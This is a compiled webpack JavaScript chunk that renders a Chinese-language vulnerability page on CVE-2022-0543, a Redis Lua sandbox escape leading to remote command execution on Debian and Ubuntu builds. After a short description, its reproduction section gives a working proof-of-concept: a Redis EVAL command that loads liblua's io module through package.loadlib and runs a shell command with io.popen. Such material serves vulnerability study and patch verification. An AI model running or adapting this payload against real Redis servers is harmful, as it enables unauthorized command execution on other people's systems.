(window.webpackJsonp=window.webpackJsonp||[]).push([[635],{1953:function(a,s,t){a.exports=t.p+"assets/img/1647571045713-b47b4478-7425-402a-a8e3-4dd572c51270.5b22d6ad.png"},3232:function(a,s,t){"use strict";t.r(s);var e=t(64),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"redis-lua-沙箱绕过-远程命令执行-cve-2022-0543"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#redis-lua-沙箱绕过-远程命令执行-cve-2022-0543"}},[a._v("#")]),a._v(" Redis Lua 沙箱绕过 远程命令执行 CVE-2022-0543")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。")]),a._v(" "),s("p",[a._v("Debian以及Ubuntu发行版的源在打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("p",[a._v("Redis")]),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("远程连接Redis, 执行POC")]),a._v(" "),s("div",{staticClass:"language-javascript line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[a._v("eval "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('\'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res\'')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:t(1953),alt:"img"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);